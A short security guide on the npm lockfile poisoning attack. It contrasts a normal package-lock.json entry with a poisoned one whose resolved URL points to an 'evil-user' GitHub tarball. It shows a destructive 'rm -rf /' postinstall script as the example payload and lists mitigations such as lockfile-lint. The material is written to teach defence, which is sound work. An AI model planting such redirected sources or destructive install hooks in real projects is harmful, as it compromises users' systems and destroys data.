# Lockfile Attack

## The Attack

This attack is very specific to the Nodejs ecosystem and it [was discovered in 2019](https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/) by [Liran Tal](https://twitter.com/liran_tal).

It is quite common to include external dependencies in Nodejs. The ecosystem is heavily based in [NPM Registry (+1M packages)](https://www.npmjs.com/).

Most projects manage their dependencies using the Npm official client or Yarn. A few years ago, both tools introduced the lockfile concept to the ecosystem (`package-lock.json` and `yarn.lock`).

If the project has a lockfile available, the package manager will install the dependencies from the lockfile as the primary source of truth. This lead us to a new vector where a malicious actor can submit a poisonous dependency through the lockfile as most of maintainers don't review the lockfiles during the PR Reviews.

This is a regular `package-lock.json`.

```json
{
  "name": "my-project",
  "version": "0.0.1",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "@babel/code-frame": {
      "version": "7.8.3",
      "resolved": "https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.8.3.tgz",
      "integrity": "sha512-a9gxpmdXtZEInkCSHUJDLHZVBgb1QS0jhss4cPP93EW7s+uC5bikET2twEF3KV+7rDblJcmNvTR7VJejqd2C2g==",
      "dev": true,
      "requires": {
        "@babel/highlight": "^7.8.3"
      }
    }
    //...
  }
}
```

The malicious attack takes place when the `resolved` and `integrity` are not corresponding to official sources:


```json
{
  "name": "my-project",
  "version": "0.0.1",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "@babel/code-frame": {
      "version": "7.8.3",
      "resolved": "https://github.com/evil-user/code-frame/tarball/master",
      "integrity": "sha512-VT0ZI6kZRdTh8YyJw3SMbYm/u+NqfsAxEpWO0Pf9sq8/e94WxxOpPKx9FR1FlyCtOVDNOQ+8ntlqFxiRc+r5qA==",
      "dev": true,
      "requires": {
        "@babel/highlight": "^7.8.3"
      }
    }
    //...
  }
}
```

So the risk in this case is that `@babel/code-frame` is not installed from the NPM registry. This can lead to many attacks based on the npm lifecycle (pre-install, post-install...)

As an example of malicious script added in the poisoned version of `@babel/code-frame`
```
"scripts": {
   "postinstall": "rm -rf /",
}
```

## The solution

There are no definitive solutions to avoid this attack, but it can be highly mitigated.

## Mitigation

- Always review the lockfiles in the PRs.
- Use a tool to check the lockfile sources enables like `lockfile-lint`
    ```bash
    npx lockfile-lint --path yarn.lock --type yarn --validate-https --allowed-hosts yarnpkg.org
    ```
- Include the validation tools in the CI process (testing phase and security checks)
- Optional: You can include the sources validation with Git Hooks too (using Husky)
